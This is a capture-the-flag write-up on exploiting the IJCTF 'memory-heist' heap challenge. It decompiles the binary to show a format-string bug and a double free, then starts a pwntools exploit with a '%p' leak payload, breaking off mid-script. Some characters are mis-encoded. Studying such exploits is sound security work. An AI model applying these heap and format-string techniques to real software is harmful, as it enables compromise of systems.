I"”%
<h1 id="intro">Intro</h1>

<p>So <a href="https://ctftime.org/event/1382">IJCTF</a> happened recently, taking place over the weekend from the 24th of June. It had some pretty damn good challenges, and was a great way for me and the rest of <a href="https://ctftime.org/team/116018">zh3r0</a> to rejuvenate after being battered by the hellhole that was google CTF. So lets get into one of these challenges.</p>

<p><code class="language-plaintext highlighter-rouge">memory-heist</code> specifically was solved by my team-mate. His solution was quite baffling at first but after debugging and running through it a few times I understood. This is the exploit I will be using (and explaining) during this writeup, so I hope it can help you understand the awesome way this was exploited.</p>

<p>As usual, the exploit script is in the folder with this writeup (if this ends up on GitHub, anyway]). So if that‚Äôs all you need, there it is.</p>

<p>With that out of the way, lets take a look at the challenge binary.</p>

<h2 id="setup">Setup</h2>

<p>‚Ä¶ But before we can do that there is a problem. Stripped libc. If you don‚Äôt mind not having access to <code class="language-plaintext highlighter-rouge">pwndbg</code>s <code class="language-plaintext highlighter-rouge">heap</code> command for looking at heap chunks, you can skip this part, but this is gonna get pretty technical so I would recommend following. You can get the debug symbols by running:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://es.archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6-dbg_2.31-0ubuntu9.2_amd64.deb
</code></pre></div></div>

<p>And then</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg <span class="nt">-x</span> libc6-dbg_2.31-0ubuntu9.2_amd64.deb <span class="nb">.</span>
</code></pre></div></div>

<p>To extract them to the current directory. Next I used <code class="language-plaintext highlighter-rouge">eu-unstrip</code> to copy the debug symbols from the unstripped libc, over to the stripped one provided, alternatively you could just replace the libc, but I only thought of that now -_-.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>eu-unstrip ./libc.so.6 usr/lib/debug/lib/x86_64-linux-gnu/libc-2.31.so <span class="nt">-o</span> ./libc.so.6.dbg
</code></pre></div></div>

<p>Now you should have <code class="language-plaintext highlighter-rouge">libc.so.6.dbg</code> which you can exchange with the provided libc as you wish. No need for any patching because the challenge creator‚Äôs had the foresight to load the linker AND libc from the current directory. Thanks guys.</p>

<h1 id="what">What</h1>

<p>First, lets see the challenge description:</p>

<p><code class="language-plaintext highlighter-rouge">Hereee! You got both printf() and UAF. Lets see if you can get the flag :)</code></p>

<p>Very bold‚Ä¶ Lets see about that.</p>

<p>Now that we have that out of the way we can take a look at how the binary runs, and see what it does, then we can delve in with the disassembler/de-compiler of your choice. First lets run and explore some program functionality:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@nomu:~/D/I/memory_heist
‚ùØ‚ùØ ./memory-heist                                                                                                                    

Welcome to Memory Heist.

1. Allocate
2. Delete
3. Print
&gt; 1
Enter the index for memory.
&gt; 0
Enter the size of memory.
&gt; 1337
Memory&gt; asdfasdfasdf
Saved.
1. Allocate
2. Delete
3. Print
&gt; 3
Re-visting memories comes at a cost.
Should you choose to accept to re-visit, half of your memories will be lost.
[Y/N]&gt; Y
Index&gt; 0
Contents:asdfasdfasdf1. Allocate
2. Delete
3. Print
&gt;
1. Allocate
2. Delete
3. Print
&gt; 2
Enter the index.
&gt; 0
Done.
  [--snipped--]
fish: ‚Äú./memory-heist‚Äù terminated by signal SIGALRM (Timer expired)

</code></pre></div></div>

<p>So we have 3 options: ‚ÄúAllocate‚Äù, ‚ÄúDelete‚Äù, and ‚ÄúPrint‚Äù. ‚ÄúAllocate‚Äù asks for an index, then a size, and then the contents. We can then ‚ÄúPrint‚Äù the contents given an index. And finally we can ‚ÄúDelete‚Äù once done. Were also rudely interrupted by an <code class="language-plaintext highlighter-rouge">alarm()</code>, so were definitely not meant to do this manually, huh.</p>

<p>This looks like a pretty standard heap note challenge; we can allocate some space that we control at will, fill it with data which we also control, and then free/delete said allocation once done.</p>

<p>So lets take a look at our program in IDA/Ghidra to confirm or deny this hypothesis.</p>

<h1 id="reversing">Reversing</h1>
<h2 id="main">main()</h2>

<p>Since the binary is pretty small its feasible to walk through the binary one function at a time, so lets see what‚Äôs up:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">choice</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">welcome</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">choice</span> <span class="o">=</span> <span class="n">menu</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">print</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">allocate</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">delete</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Duh!"</span><span class="p">);</span>
  <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Okay, so first we call a function <code class="language-plaintext highlighter-rouge">welcome()</code>. This is pretty simple, just give us a welcome message, and setup a semi-random <code class="language-plaintext highlighter-rouge">alarm()</code> timer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">welcome</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">lol</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">lol</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
  <span class="n">alarm</span><span class="p">(</span><span class="n">lol</span> <span class="o">%</span> <span class="mi">1337</span> <span class="o">/</span> <span class="mi">20</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Welcome to Memory Heist.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So that‚Äôs why we get kicked out almost immediately. Next we enter a command loop from which we enter our choice:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
<span class="p">{</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="n">menu</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">print</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
    <span class="k">break</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">allocate</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">delete</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The first thing we do inside the loop is call <code class="language-plaintext highlighter-rouge">menu()</code> to display our options banner, then take said option, and return it:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">menu</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">choice</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="n">choice</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">choice</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"1. Allocate"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"2. Delete"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"3. Print"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="n">choice</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">choice</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Back in the main command loop, we have branches for each corresponding option, and if we do not have any of these as our choice we leave the command loop and <code class="language-plaintext highlighter-rouge">exit()</code>.</p>

<p>Firstly, lets take a look at <code class="language-plaintext highlighter-rouge">allocate()</code>:</p>

<h2 id="allocate">allocate()</h2>

<p>We can already see some recognizable strings:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">allocate</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">idx_dup</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>

  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">nbytes</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the index for memory."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the size of memory."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0xB</span> <span class="o">||</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span><span class="p">)[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Duh!"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">idx_dup</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
  <span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span><span class="p">)[</span><span class="n">idx_dup</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nbytes</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Memory&gt; "</span><span class="p">);</span>
  <span class="n">nbytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x4100</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">nbytes</span> <span class="o">+</span> <span class="mi">159</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memcpy</span><span class="p">((</span><span class="o">&amp;</span><span class="n">chunks</span><span class="p">)[</span><span class="n">idx</span><span class="p">],</span> <span class="mh">0x4100</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>       <span class="c1">// smash &amp;chunks + idx?</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Saved."</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">canary</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So, looks like how we would expect; we enter <code class="language-plaintext highlighter-rouge">idx</code>, <code class="language-plaintext highlighter-rouge">nbytes</code> and then input contents, although the way contents is received is a little strange; first data is read from stdin into <code class="language-plaintext highlighter-rouge">.bss</code> rather than first <code class="language-plaintext highlighter-rouge">malloc()</code>ing a chunk of size <code class="language-plaintext highlighter-rouge">nbytes</code> and THEN reading data in from there. Doing it this way allows us to write as much data into <code class="language-plaintext highlighter-rouge">.bss</code> as we want, and although there‚Äôs nothing interesting you could do with this its still a little strange.</p>

<p>Anyway, if our <code class="language-plaintext highlighter-rouge">idx</code> doesn‚Äôt stray OOB, and the current slot is not occupied we are able to store our allocated memory there, our input is then read into + copied from <code class="language-plaintext highlighter-rouge">.bss</code> to our allocation after first being null terminated (I‚Äôm sort of sure that‚Äôs what <code class="language-plaintext highlighter-rouge">*(&amp;chunks + nbytes + 159) = 0;</code> is doing, anyway).</p>

<p>So summed up, <code class="language-plaintext highlighter-rouge">allocate()</code> does a couple things:</p>
<ul>
  <li>Take <code class="language-plaintext highlighter-rouge">idx</code>, <code class="language-plaintext highlighter-rouge">nbytes</code>, and chunk Contents.</li>
  <li>Verify our <code class="language-plaintext highlighter-rouge">idx</code> does not go OOB and that we aren‚Äôt replacing an allocation which is in use.</li>
  <li>If we abide by the rules above, copy our contents into our <code class="language-plaintext highlighter-rouge">allocation</code>.</li>
</ul>

<p>Lets move on to the next function, <code class="language-plaintext highlighter-rouge">print()</code>.</p>

<h2 id="print">print()</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">print</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">idx1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF</span>
  <span class="n">__int64</span> <span class="n">isPCT</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">chr</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-10h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>

  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">chr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Re-visting memories comes at a cost."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Should you choose to accept to re-visit, half of your memories will be lost."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[Y/N]&gt; "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">6uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'N'</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'n'</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Thats alright."</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Index&gt; "</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx1</span><span class="p">);</span>               <span class="c1">// idx not checked here</span>
    <span class="n">chr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">idx1</span><span class="p">);</span>                    <span class="c1">// uaf here</span>
    <span class="n">isPCT</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="n">chr</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">chr</span> <span class="o">==</span> <span class="sc">'%'</span> <span class="p">)</span>
        <span class="n">isPCT</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">isPCT</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">chr</span> <span class="o">==</span> <span class="sc">'n'</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Whoaa! Whatcha doin'?"</span><span class="p">);</span>
        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="o">++</span><span class="n">chr</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Contents:"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">idx1</span><span class="p">));</span>                  <span class="c1">// fmt string vuln</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">idx1</span> <span class="o">&amp;=</span> <span class="mi">1u</span><span class="p">;</span> <span class="n">idx1</span> <span class="o">&lt;=</span> <span class="mh">0xB</span><span class="p">;</span> <span class="n">idx1</span> <span class="o">+=</span> <span class="mi">2LL</span> <span class="p">)</span>
      <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">idx1</span><span class="p">)</span> <span class="o">=</span> <span class="err">'</span><span class="n">Timaohw</span><span class="err">'</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">canary</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We print the all too familiar prompt, then ask for a choice, <code class="language-plaintext highlighter-rouge">[Y/N]</code>. Choosing <code class="language-plaintext highlighter-rouge">N</code>/<code class="language-plaintext highlighter-rouge">n</code> simply returns us to the command loop, but any other char will take us forward.</p>

<p>We read an <code class="language-plaintext highlighter-rouge">idx</code>. Interestingly enough (though not relevant for our exploit) is that said <code class="language-plaintext highlighter-rouge">idx</code> is not checked for OOB. I‚Äôm not sure if this is a feature of the challenge for not, but this allows you to specify an arbitrary <code class="language-plaintext highlighter-rouge">idx</code> which will then be printed from.</p>

<p>Next we get the corresponding pointer for the given <code class="language-plaintext highlighter-rouge">idx</code> and iterate through the contents of our chunk, if we give <code class="language-plaintext highlighter-rouge">%n</code> as part of our buffer during <code class="language-plaintext highlighter-rouge">allocate()</code>, we will exit the program upon detecting that (format string incoming).</p>

<p>After this we pass our chunk contents directly into <code class="language-plaintext highlighter-rouge">printf</code>. Here is our format string bug, like the challenge description promised - but with the constraint that no <code class="language-plaintext highlighter-rouge">%n</code> is allowed, so no writing memory using this. Like promised at the start of the program, we will now lose half of our <code class="language-plaintext highlighter-rouge">memories</code>, in this case being our chunks. The string ‚ÄúwhoamIT‚Äù will be written to half of our chunk slots, making them effectively useless.</p>

<p>Once placed here, these cannot be cleared, which means we cant use these slots for any more allocations, and we certainly cant free/delete them, as we will see soon.</p>

<p>Anyhow, we then check the canary and are returned to our command loop, but this time with serious <code class="language-plaintext highlighter-rouge">amnesia</code>‚Ä¶ Haha geddit? Because memories?????? Okay I‚Äôll stop.</p>

<h2 id="delete">delete()</h2>

<p>Finally we come to the crux of the issue, and arguably the most important function in our program. We come to the UAF:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">delete</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the index."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mh">0xB</span> <span class="o">||</span> <span class="o">!*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">||</span> <span class="o">*</span><span class="n">free_hook</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Duh!"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">v1</span><span class="p">));</span>                        <span class="c1">// free'd, but not cleared. ALSO not checked if freed previously</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Done."</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This function is pretty small, and all it does is validate, again that we don‚Äôt go OOB, then <code class="language-plaintext highlighter-rouge">free()</code>s a chunk in a given <code class="language-plaintext highlighter-rouge">idx</code> slot. It also checks if the <code class="language-plaintext highlighter-rouge">__free_hook</code> has been overwritten, and this is something we will need to bypass later.</p>

<p>You may notice a couple things, and if you have props to you, because I didn‚Äôt see this until very, very late in the CTF. We do not check the validity of any pointer we <code class="language-plaintext highlighter-rouge">free()</code>. This, combined with the fact that <code class="language-plaintext highlighter-rouge">free()</code>d chunks are never cleared could allow us to free a chunk twice. During the period between when it was last <code class="language-plaintext highlighter-rouge">free()</code>d we could have replaced crucial chunk metadata such as the size. This is what our exploit abuses.</p>

<p>With a combination of tricks with heap consolidation and <code class="language-plaintext highlighter-rouge">unsorted</code> bin chunks, we are able to write into <code class="language-plaintext highlighter-rouge">__free_hook</code>. Lets take a look at how this is achieved, shall we?</p>

<h1 id="exploitation">Exploitation</h1>

<p>So lets take a look at the script, minus the insane amount of comments I made trying to understand this, shall we?</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>                                                                                                                    

<span class="n">binary</span> <span class="o">=</span> <span class="s">"./memory-heist"</span>
<span class="c1">#script = '''
#
#b *main-0x5f
#'''
</span>
<span class="c1"># muh debugging
</span><span class="k">def</span> <span class="nf">attach_stop</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="nb">raw_input</span><span class="p">()</span>

<span class="c1"># allocate a chunk
</span><span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'Memory&gt; '</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="c1"># free a chunk
</span><span class="k">def</span> <span class="nf">sice</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="c1"># view a chunk - this also wipes out half of our `chunks` array
</span><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">kek</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'[Y/N]&gt; '</span><span class="p">,</span><span class="n">kek</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>

<span class="c1"># start
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
    <span class="c1">#p = remote('35.244.10.136', 10253)
</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x208</span><span class="p">,</span><span class="s">'AA'</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span><span class="s">'AA'</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">'AAAA'</span><span class="p">)</span>

    <span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'</span><span class="p">)</span> <span class="c1"># leaky chunk
</span>
